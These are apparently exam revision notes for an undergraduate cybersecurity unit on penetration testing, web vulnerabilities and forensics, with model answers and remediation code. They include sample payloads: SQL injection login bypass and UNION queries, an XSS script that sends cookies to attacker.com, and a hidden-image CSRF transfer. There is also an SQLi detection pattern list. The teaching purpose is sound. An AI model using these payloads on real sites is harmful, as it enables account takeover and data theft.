# BCA-431E: Introduction to Cyber Security
## Unit 5 Master Exam Revision Notes: Security Testing, Ethical Hacking & Fraud Prevention
**Target Examination:** MJPRU Bareilly BCA Semester 5 (CBCS Pattern 2024–25)
**Unit Identifier:** `8237013e-e858-5df9-92cb-10b7404fb1a1` | **Weightage:** 15–20 Marks in University Exam

---

### 📋 Official MJPRU Syllabus Topic Checklist
- [x] **Cyber Security Testing Methodologies: Vulnerability Assessment (VA) vs Penetration Testing (PT), VAPT Workflows**
- [x] **Penetration Testing Phases: Reconnaissance (OSINT), Scanning & Enumeration, Vulnerability Exploitation, Post-Exploitation, Reporting**
- [x] **Penetration Testing Types: Black Box (Zero Knowledge), White Box (Full Knowledge), Gray Box (Partial Knowledge) Testing**
- [x] **Intrusion Detection Systems (IDS): Network-Based (NIDS) vs Host-Based (HIDS), Signature-Based vs Anomaly-Based Detection, False Positives/Negatives**
- [x] **Intrusion Prevention Systems (IPS): In-Line Traffic Filtering, Automated Rule Enforcement, Honeypots & Decoy Systems**
- [x] **Security Information and Event Management (SIEM): Log Aggregation, Normalization, Real-Time Correlation, Security Orchestration (SOAR)**
- [x] **Basic Concepts of Ethical Hacking: Hacker Types (White Hat, Black Hat, Gray Hat), Ethical Hacking Code of Conduct, Legal Authorization (Rules of Engagement)**
- [x] **Ethical Hacking Toolkits: Nmap (Port Scanning), Wireshark (Packet Sniffing), Metasploit (Exploit Framework), Burp Suite (Web Testing)**
- [x] **Identity Theft: Types (Financial, Medical, Criminal), Modus Operandi, Credential Harvesting, Defense and Identity Protection Mechanisms**
- [x] **Cyber Stalking and Cyber Harassment: Definition, Tracking Technologies (Spyware, Geolocation Exploits), Legal Remedies & Personal Defense Strategies**
- [x] **Online Investment Fraud & Financial Scams: Ponzi Schemes, Cryptocurrency Rug Pulls, Advance Fee Fraud (419), Fake Banking Portals**
- [x] **Cyber Hygiene Best Practices: Multi-Factor Authentication (MFA), Password Managers, Secure Backup 3-2-1 Rule, Safe Browsing Habits**

---

## 📌 Section A: High-Yield Very Short Answer Questions (2 Marks Each)
*Target: Write precise, definition-focused answers in 2–3 sentences or structured tables to secure maximum marks.*

### Q1. [2 Marks] What is the difference between Vulnerability Assessment and Penetration Testing (VAPT)?
**Model Answer:**
- **Vulnerability Assessment (VA):** Automated scanning to discover, list, and categorize known vulnerabilities in a system without actively exploiting them.
- **Penetration Testing (PT):** Authorized, simulated active cyber attack to actively exploit discovered vulnerabilities to measure real-world impact and depth of compromise.

### Q2. [2 Marks] Name the five classic phases of Ethical Hacking.
**Model Answer:**
1. **Reconnaissance (Footprinting)**
2. **Scanning and Enumeration**
3. **Gaining Access (Exploitation)**
4. **Maintaining Access (Persistence / Backdoors)**
5. **Covering Tracks (Clearing Logs)**

### Q3. [2 Marks] What is the OWASP Top 10?
**Model Answer:**
A regularly updated, globally recognized consensus document published by the Open Worldwide Application Security Project (OWASP) detailing the ten most critical web application security risks.

### Q4. [2 Marks] Explain SQL Injection (SQLi) and how it occurs.
**Model Answer:**
An injection flaw where an attacker submits malicious SQL fragments through input fields, which are directly concatenated into database queries by the backend, allowing unauthorized database querying or data deletion.

### Q5. [2 Marks] What is Cross-Site Scripting (XSS)?
**Model Answer:**
An attack where malicious client-side JavaScript code is injected into otherwise trusted web pages, executing in unsuspecting victim browsers to steal session cookies or credentials.

### Q6. [2 Marks] Differentiate between Stored XSS and Reflected XSS.
**Model Answer:**
- **Stored (Persistent) XSS:** Malicious script is permanently stored in the target server's database (e.g., in blog comments) and served to every visitor.
- **Reflected (Non-Persistent) XSS:** Malicious script is bounced off the web server via URL parameters or search fields, executing only when a victim clicks the malicious link.

### Q7. [2 Marks] What is Cross-Site Request Forgery (CSRF)?
**Model Answer:**
An attack that tricks an authenticated victim's browser into executing unwanted actions on a trusted web application where the victim is currently logged in, exploiting the browser's automatic inclusion of session cookies.

### Q8. [2 Marks] How do Anti-CSRF Tokens prevent CSRF attacks?
**Model Answer:**
The server embeds a unique, unpredictable, secret cryptographically random token inside forms. When submitted, the server compares the submitted form token with the session token; since cross-origin attackers cannot read the token (due to Same-Origin Policy), forged requests fail.

### Q9. [2 Marks] What is Digital Forensics and Chain of Custody?
**Model Answer:**
- **Digital Forensics:** The application of scientific investigation techniques to identify, preserve, extract, and analyze digital evidence for court admissibility.
- **Chain of Custody:** The chronological documentation showing the seizure, custody, control, transfer, and analysis of physical/electronic evidence.

### Q10. [2 Marks] What is Clickjacking (UI Redressing)?
**Model Answer:**
A deceptive attack where a malicious website overlays a transparent `<iframe>` of a legitimate site over decoy buttons, tricking the user into clicking sensitive actions (e.g., 'Delete Account' or 'Transfer Funds').


---

## 📌 Section B: Conceptual Short Answer Questions (5 Marks Each)
*Target: Provide structured answers in 150–200 words with headings, block diagrams, and comparison matrices.*

### Q1. [5 Marks] Compare Black Box, White Box, and Grey Box Penetration Testing.
**Model Answer:**
| Dimension | Black Box Testing | White Box Testing | Grey Box Testing |
| :--- | :--- | :--- | :--- |
| **Prior Knowledge** | Zero knowledge of target internal architecture | Complete access to source code, architecture, and configs | Partial knowledge (e.g., user credentials, high-level map) |
| **Simulates** | External adversary / Opportunistic hacker | Rogue insider developer / Source code auditor | Disgruntled employee / Authorized external partner |
| **Time & Cost** | Time-intensive, high reconnaissance | Comprehensive, finds subtle logic bugs | Balanced efficiency and real-world simulation |

### Q2. [5 Marks] Explain the OWASP Top 10 (Current Edition) Categories.
**Model Answer:**
1. **A01: Broken Access Control:** Bypassing authorization checks to view unauthorized data.
2. **A02: Cryptographic Failures:** Weak ciphers, cleartext transmission of sensitive data.
3. **A03: Injection:** SQL, NoSQL, OS command injection.
4. **A04: Insecure Design:** Flaws in system architecture before code is written.
5. **A05: Security Misconfiguration:** Default passwords, exposed debugging interfaces.
6. **A06: Vulnerable and Outdated Components:** Using unpatched third-party npm/pip libraries.
7. **A07: Identification and Authentication Failures:** Brute-force attacks, session fixation.
8. **A08: Software and Data Integrity Failures:** Unsigned software updates.
9. **A09: Security Logging and Monitoring Failures:** Insufficient logging preventing detection.
10. **A10: Server-Side Request Forgery (SSRF):** Coercing server to fetch internal network resources.

### Q3. [5 Marks] Detail the SQL Injection Attack Vector: `OR 1=1` Authentication Bypass.
**Model Answer:**
```sql
-- Vulnerable Backend Code:
SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "';

-- Attacker Input in Username Field:
' OR '1'='1' --

-- Resulting Evaluated SQL Query:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
```
- Because `'1'='1'` is always `TRUE`, the `WHERE` clause evaluates to `TRUE` for all rows.
- The `--` comment indicator comments out the remaining password check.
- The database returns the first record (usually Administrator), bypassing authentication!

### Q4. [5 Marks] Explain CSRF vs XSS Differences.
**Model Answer:**
| Feature | Cross-Site Scripting (XSS) | Cross-Site Request Forgery (CSRF) |
| :--- | :--- | :--- |
| **Core Execution**| Injects and executes arbitrary JavaScript in victim browser | Tricks browser into making HTTP requests victim did not intend |
| **Exploitation** | Steals session cookies, redirects pages, logs keystrokes | Performs unauthorized actions (changes password, transfers funds) |
| **Prerequisite** | Vulnerability in target app rendering unescaped output | Victim must have an active authenticated session on target site |
| **Primary Defense**| Context-aware HTML escaping and Content Security Policy (CSP)| Anti-CSRF synchronization tokens and `SameSite=Strict` cookies |

### Q5. [5 Marks] Describe Digital Forensics Evidence Acquisition: Order of Volatility.
**Model Answer:**
Digital evidence must be acquired in order of volatility from most ephemeral to most stable:
1. CPU Registers and Cache memory
2. System RAM (Physical Memory Dump)
3. Network state and routing tables
4. Running processes and kernel statistics
5. Hard Disk storage and swap space
6. Remote logging data and archived backup tapes.


---

## 📌 Section C: Comprehensive Long Answer Descriptive Questions (10–15 Marks Each)
*Target: Elaborate answers in 400–600 words featuring complete architectural diagrams, full code implementations, mathematical derivations, or real-world enterprise case studies.*

### Q1. [10/15 Marks] Provide an In-Depth Technical Demonstration of SQL Injection, Cross-Site Scripting (XSS), and Cross-Site Request Forgery (CSRF) with Full Attack Payloads and Robust Remediation Code.
**Comprehensive University Solution:**
### Comprehensive Web Security Vulnerability Breakdown

#### 1. SQL Injection (SQLi):
- **Attack Payload:** In an item search query: `?category=books' UNION SELECT null, username, password_hash FROM admin_users--`
- **Mechanics:** `UNION SELECT` merges results from administrative tables into the public search output.
- **Remediation (Prepared Statements):**
```java
// SECURE: Parameterized Query separates SQL logic from data
String sql = "SELECT id, name, price FROM products WHERE category = ?";
PreparedStatement ps = connection.prepareStatement(sql);
ps.setString(1, userCategoryInput);
ResultSet rs = ps.executeQuery();
```

#### 2. Cross-Site Scripting (XSS):
- **Attack Payload:** User comments input: `<script>fetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));</script>`
- **Mechanics:** Browser executes the injected script as valid code, transmitting the victim's session cookie to the attacker.
- **Remediation:** Context-aware output encoding and modern browser defense:
```html
<!-- SECURE: HTML entity escaping turns dangerous characters into inert text -->
<p>Welcome, &lt;script&gt;...&lt;/script&gt;</p>

<!-- HTTP Response Header Defense: -->
Set-Cookie: sessionId=...; Secure; HttpOnly; SameSite=Strict
Content-Security-Policy: default-src 'self'; script-src 'self';
```
*`HttpOnly` blocks JavaScript from reading `document.cookie` entirely!*

#### 3. Cross-Site Request Forgery (CSRF):
- **Attack Scenario:** Attacker lures logged-in banking user to `malicious.com`, containing:
```html
<img src="https://bank.com/transfer?recipient=Attacker&amount=10000" style="display:none;">
```
- **Remediation (Anti-CSRF Synchronizer Token):**
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="d8f3a9b1c7e2...">
  <input type="text" name="recipient">
  <input type="submit" value="Send">
</form>
```

### Q2. [10/15 Marks] Detail the 5 Phases of Ethical Hacking and Penetration Testing Methodology with Industry Toolchains.
**Comprehensive University Solution:**
### Ethical Hacking Methodology Framework

```
[ 1. Reconnaissance ] ---> [ 2. Scanning ] ---> [ 3. Exploitation ] ---> [ 4. Persistence ] ---> [ 5. Reporting ]
  - OSINT / Whois             - Nmap Port Scan    - Metasploit Framework   - Scheduled Tasks       - Executive Summary
  - theHarvester              - Nessus / OpenVAS  - Burp Suite Pro         - Netcat Backdoor       - Technical Findings
  - Shodan                    - Nikto Web Scan    - SQLmap                 - Privilege Escalation  - Remediation Roadmap
```

#### Detailed Phase Breakdown:
1. **Reconnaissance (Passive & Active):** Information gathering without directly interacting with defensive firewalls (Passive) or active DNS zone transfers and ping sweeps (Active).
2. **Scanning & Enumeration:** Discovering live hosts, open TCP/UDP ports, running service versions, OS finger-printing, and banner grabbing.
3. **Gaining Access (Exploitation):** Leveraging discovered vulnerabilities (e.g., using Metasploit exploit modules against unpatched Apache services) to obtain an interactive shell.
4. **Maintaining Access:** Establishing persistent backdoor access (e.g., reverse TCP shell on port 443) and escalating privileges from local user to `root` / `SYSTEM`.
5. **Analysis & Reporting:** Compiling technical findings, CVSS vulnerability severity scores, evidence screenshots, and prioritized remediation recommendations.

### Q3. [10/15 Marks] Implement a Python Script to Detect SQL Injection Patterns in Web Server Access Logs.
**Comprehensive University Solution:**
```python
import re

# Common SQL Injection regular expression signatures
SQLI_PATTERNS = [
    r"(\b(SELECT|UNION|INSERT|UPDATE|DELETE|DROP|ALTER)\b.*\b(FROM|INTO|TABLE)\b)",
    r"(--|#|\/\*)", # SQL comment markers
    r"('\s*OR\s*['0-9]=\s*['0-9])", # ' OR '1'='1'
    r"(\bUNION\s+ALL\s+SELECT\b)",
    r"(\bWAITFOR\s+DELAY\b)" # Time-based blind
]

def analyze_log_line(log_line):
    for pattern in SQLI_PATTERNS:
        match = re.search(pattern, log_line, re.IGNORECASE)
        if match:
            return True, match.group(0)
    return False, None

# Sample Web Server Access Logs
sample_logs = [
    '192.168.1.10 - - [18/Oct/2026:10:00:01] "GET /products?id=12 HTTP/1.1" 200 1420',
    '192.168.1.55 - - [18/Oct/2026:10:02:15] "GET /login?user=admin%27%20OR%20%271%27=%271-- HTTP/1.1" 302 450',
    '192.168.1.80 - - [18/Oct/2026:10:05:40] "GET /search?q=books%27%20UNION%20SELECT%20null,password%20FROM%20users-- HTTP/1.1" 200 3200'
]

print("Analyzing Server Logs for SQL Injection Attacks:")
print("-" * 70)
for log in sample_logs:
    is_attack, signature = analyze_log_line(log)
    if is_attack:
        print(f"[ALERT - SQLi DETECTED] Matched Pattern: '{signature}'\nLog: {log}\n")
    else:
        print(f"[CLEAN] {log}\n")
```


---

## 💡 Exam Hall Strategy & Examiner Insights for this Unit
Examiners frequently ask: VAPT definitions, SQL Injection and XSS mechanics with remediation (guaranteed 10-15 marks Section C), and 5 phases of ethical hacking.

---
*Verified against official MJPRU BCA 2024–25 Syllabus by XRounder Academic Team.*